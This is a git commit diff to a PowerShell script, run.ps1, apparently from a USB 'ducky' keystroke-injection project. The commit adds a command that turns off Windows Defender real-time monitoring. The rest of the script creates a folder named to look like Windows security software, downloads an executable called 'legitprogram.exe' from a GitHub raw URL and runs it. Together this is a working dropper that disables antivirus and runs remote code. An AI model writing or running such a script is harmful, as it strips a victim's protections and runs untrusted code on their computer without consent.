051446d3dbc80317143e44325e02c43ef10c7195
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-05 08:57:51 +0000

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,3 +1,4 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
 New-Item -Path "C:\ProgramData\Windows Malware Protection" -ItemType directory
 Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/legitprogram.exe -OutFile "C:\ProgramData\Windows Malware Protection\legitprogram.exe"
 Start-Process 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
